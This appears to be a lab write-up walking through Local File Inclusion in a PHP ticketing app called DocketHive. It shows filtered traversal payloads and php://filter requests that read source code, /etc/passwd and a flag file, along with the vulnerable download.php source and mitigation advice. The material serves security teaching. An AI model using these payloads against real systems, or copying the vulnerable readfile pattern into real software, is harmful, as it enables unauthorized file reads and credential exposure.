---
title: "Local File Inclusion via PHP Stream Wrappers | DocketHive"
date: 2026-05-15 02:05:00 +0530
categories: [Web Security, Local File Inclusion]
tags: [lfi, php, php-stream-wrapper, file-inclusion, path-traversal, burp-suite, webversepro]
author: Shivansh Sharma
platform: WebVerse Labs
image:
  path: /assets/images/posts/dockethive.webp
  alt: DocketHive WebVerse Lab
---

# Local File Inclusion via PHP Stream Wrappers | DocketHive

## Overview

DocketHive is a beginner-friendly PHP security lab from WebVerse Labs focused on Local File Inclusion (LFI) through PHP stream wrappers.

The application is an event ticketing SaaS where users can register for events and download generated receipts. While testing the download functionality, a vulnerable file handling implementation allowed arbitrary file reads using PHP wrappers.

This lab demonstrates a common developer mistake where traversal protections are implemented incorrectly while dangerous PHP stream wrappers remain accessible.

## Lab Link

- Lab: [DocketHive – WebVerse](https://dashboard.webverselabs-pro.com/labs/dockethive)

## Objective

Identify and exploit the vulnerable file download functionality to achieve arbitrary file read and retrieve the flag.

---

## Hosts Configuration

Add the lab hostname locally before accessing the application.

```bash
echo "10.100.0.30 app.dockethive.io" | sudo tee -a /etc/hosts
```

---

## Initial Reconnaissance

After visiting the application, the platform allowed registration as either:

- Event Organizer
- Event Attender

Initial testing against the organizer functionality did not reveal anything interesting, so the focus shifted to the attendee workflow.

After account registration and login, the dashboard became accessible.

```text
http://app.dockethive.io/dashboard
```

An event page was then opened.

```text
http://app.dockethive.io/events/3
```

The event registration workflow generated an order confirmation.

```text
http://app.dockethive.io/events/3/register
```

After registration, the application redirected to:

```text
http://app.dockethive.io/events/3/register?confirmation=1&order_id=320
```

---

## Discovering the Vulnerable Endpoint

While reviewing the confirmation page, a receipt download option appeared.

The downloaded PDF was mostly empty, so Burp Suite history was inspected to locate the underlying request.

The following endpoint was identified:

```http
GET /download.php?file=receipt_46058.pdf HTTP/1.1
Host: app.dockethive.io
```

At first glance, the `file` parameter strongly suggested a file inclusion vulnerability.

Multiple traversal payloads were attempted but failed.

Examples that were blocked:

```text
../../../etc/passwd
..\..\windows\win.ini
/etc/passwd
file:///etc/passwd
```

This indicated the developer had implemented basic traversal filtering.

---

## Exploitation

### PHP Stream Wrapper Abuse

Although traversal sequences were filtered, PHP stream wrappers were still accessible.

The following payload was used:

```http
GET /download.php?file=php://filter/convert.base64-encode/resource=download.php HTTP/1.1
Host: app.dockethive.io
```

The response returned Base64 encoded source code.

The content was decoded directly using Burp Suite Inspector.

---

## Vulnerable Source Code

```php
<?php
// Serves receipt PDFs and other event-related downloads
// Used by the order confirmation and ticket pages

if (!isset($_GET['file'])) {
    header('HTTP/1.0 400 Bad Request');
    exit('Missing file parameter');
}

$file = $_GET['file'];

// Reject obviously malformed filenames
if (strpos($file, '../') !== false
    || strpos($file, '..\\') !== false
    || isset($file[0]) && $file[0] === '/'
    || stripos($file, 'file://') === 0) {
    header('HTTP/1.0 400 Bad Request');
    exit('Invalid file path.');
}

$path = __DIR__ . '/uploads/' . $file;

if (file_exists($path)) {
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));

    if ($ext === 'pdf') {
        header('Content-Type: application/pdf');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
    }

    readfile($path);
} else {
    readfile($file);
}
```

---

## Vulnerability Analysis

The developer attempted to block:

- `../`
- `..\`
- Absolute paths
- `file://`

However, the application still passed user-controlled input directly into:

```php
readfile($file);
```

This became reachable whenever the constructed upload path did not exist.

Because PHP stream wrappers were not restricted, arbitrary file reads became possible through:

```text
php://filter
```

The `convert.base64-encode` filter was especially useful because it safely returned file contents without binary corruption.

---

## Reading System Files

The `/etc/passwd` file was retrieved using:

```http
GET /download.php?file=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: app.dockethive.io
```

After decoding the response, a valid user was identified:

```text
eric
```

At this point, the objective became locating the flag file.

---

## Retrieving the Flag

The following payload successfully accessed the user flag:

```http
GET /download.php?file=php://filter/convert.base64-encode/resource=/home/eric/flag.txt HTTP/1.1
Host: app.dockethive.io
```

The response again returned Base64 encoded content.

After decoding:

```text
WEBVERSE{REDACTED}
```

---

## Proof of Exploitation

### Vulnerable Request

```http
GET /download.php?file=php://filter/convert.base64-encode/resource=/home/eric/flag.txt HTTP/1.1
Host: app.dockethive.io
```

### Result

- Arbitrary file read
- Source code disclosure
- Sensitive configuration exposure
- Access to local user files
- Flag retrieval

---

## Impact

This vulnerability allows attackers to:

- Read application source code
- Expose database credentials
- Leak secrets and API keys
- Access local system files
- Enumerate users
- Potentially chain into remote code execution depending on environment configuration

Even though traversal payloads were filtered, incomplete validation still allowed exploitation through PHP stream wrappers.

---

## Mitigation

### Avoid User-Controlled File Paths

Never pass raw user input into file functions such as:

```php
readfile()
include()
require()
file_get_contents()
```

### Use Allowlists

Restrict downloads to explicitly approved filenames or generated identifiers.

### Disable Dangerous Wrappers

Where possible, restrict or disable unnecessary stream wrappers.

### Enforce Real Path Validation

Use canonical path validation with:

```php
realpath()
```

Then verify the resolved path remains inside the intended directory.

### Example Secure Approach

```php
$base = realpath(__DIR__ . '/uploads');
$target = realpath($base . '/' . $file);

if ($target === false || strpos($target, $base) !== 0) {
    exit('Invalid file');
}
```

---

## Real-World Insight

This lab demonstrates a very common security mistake in PHP applications.

Developers often focus only on blocking traversal sequences like `../` while forgetting that PHP exposes multiple alternate filesystem interfaces through stream wrappers.

Attackers regularly abuse:

- `php://filter`
- `zip://`
- `phar://`
- `data://`

to bypass weak filtering logic.

This is why blacklist-based protections are unreliable for file handling vulnerabilities.

---

## Key Takeaways

- Blacklist filtering is insufficient for file handling security
- PHP stream wrappers are frequently overlooked
- Source disclosure often leads to deeper compromise
- `php://filter` is extremely useful for LFI exploitation
- Always validate resolved filesystem paths, not raw input